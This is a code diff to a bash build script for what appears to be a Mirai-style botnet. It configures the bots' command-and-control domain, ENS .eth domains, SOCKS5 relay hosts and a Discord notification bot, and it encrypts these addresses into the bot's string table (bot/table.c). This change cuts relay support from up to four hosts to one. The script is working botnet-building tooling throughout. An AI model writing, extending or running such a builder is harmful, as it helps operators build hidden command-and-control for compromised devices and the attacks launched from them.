@@ -35,7 +35,7 @@ log() {
 CNC_DOMAIN=""
 USE_ENS=0
 USE_RELAY=0
-RELAY_HOSTS=()
+RELAY_HOST=""
 RELAY_PORT="1080"
 USE_DISCORD=0
 DISCORD_TOKEN=""
@@ -54,16 +54,7 @@ while [[ $# -gt 0 ]]; do
             ;;
         -r|--relay)
             USE_RELAY=1
-            RELAY_HOSTS+=("$2")
-            shift 2
-            if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
-                RELAY_PORT="$1"
-                shift
-            fi
-            ;;
-        --relay-host)
-            USE_RELAY=1
-            RELAY_HOSTS+=("$2")
+            RELAY_HOST="$2"
             shift 2
             if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
                 RELAY_PORT="$1"
@@ -97,9 +88,7 @@ while [[ $# -gt 0 ]]; do
             echo "       --ens: Compile bots with ENS (Ethereum Name Service) support"
             echo "              Allows using .eth domains like yourname.eth"
             echo "       -r, --relay: Enable relay mode. Bots connect via SOCKS5 relay"
-            echo "              You can specify multiple -r flags for multiple relays"
-            echo "              Example: -r relay1.example.com 1080 -r relay2.example.com 1080"
-            echo "       --relay-host <host>: Add a relay host"
+            echo "              Example: -r relay.example.com 1080"
             echo "       --relay-port <port>: Set relay port (default: 1080)"
             echo "       --discord <bot_token> [notification_channel_id]: Enable Discord bot"
             echo "              bot_token: Your Discord bot token from Developer Portal"
@@ -243,35 +232,24 @@ fi
 sed -i "s|^.*TABLE_CNC_DOMAIN.*|$TABLE_ENTRY|" bot/table.c
 log INFO "CNC domain encrypted in table.c"
 
-# Generate encrypted entries for relay hosts
-if [ "$USE_RELAY" -eq 1 ] && [ ${#RELAY_HOSTS[@]} -gt 0 ]; then
-    log INFO "Generating encrypted table entries for ${#RELAY_HOSTS[@]} relay(s)..."
+# Generate encrypted entry for single relay
+if [ "$USE_RELAY" -eq 1 ] && [ -n "$RELAY_HOST" ]; then
+    log INFO "Generating encrypted relay entry for: $RELAY_HOST"
     
-    # First, clear all relay entries to empty
+    # Clear all relay entries first
     for rel_idx in 1 2 3 4; do
         sed -i "s|^.*TABLE_RELAY_${rel_idx}.*|    add_entry(TABLE_RELAY_${rel_idx}, \"\", 1);|" bot/table.c
     done
     
-    # Then fill in the ones the user specified
-    for i in "${!RELAY_HOSTS[@]}"; do
-        RELAY="${RELAY_HOSTS[$i]}"
-        TABLE_INDEX=$((i + 1))
-        
-        if [ $TABLE_INDEX -gt 4 ]; then
-            log WARN "Maximum 4 relays supported, skipping: $RELAY"
-            break
-        fi
-        
-        python3 "$SCRIPT_DIR/generate_table.py" "$RELAY" > /tmp/relay_entry.txt 2>&1
-        RELAY_ENTRY=$(grep "^    add_entry" /tmp/relay_entry.txt | head -1)
-        if [ -z "$RELAY_ENTRY" ]; then
-            log ERROR "Failed to generate table entry for relay $RELAY! Contents of /tmp/relay_entry.txt:"
-            cat /tmp/relay_entry.txt
-            exit 1
-        fi
-        sed -i "s|^.*TABLE_RELAY_${TABLE_INDEX}.*|$RELAY_ENTRY|" bot/table.c
-        log INFO "  Relay $TABLE_INDEX: $RELAY encrypted"
-    done
+    python3 "$SCRIPT_DIR/generate_table.py" "$RELAY_HOST" > /tmp/relay_entry.txt 2>&1
+    RELAY_ENTRY=$(grep "^    add_entry" /tmp/relay_entry.txt | head -1)
+    if [ -z "$RELAY_ENTRY" ]; then
+        log ERROR "Failed to generate table entry for relay $RELAY_HOST! Contents:"
+        cat /tmp/relay_entry.txt
+        exit 1
+    fi
+    sed -i "s|^.*TABLE_RELAY_1.*|$RELAY_ENTRY|" bot/table.c
+    log INFO "  Relay: $RELAY_HOST encrypted"
     
     # Set the relay port in includes.h
     if [ "$RELAY_PORT" != "1080" ]; then
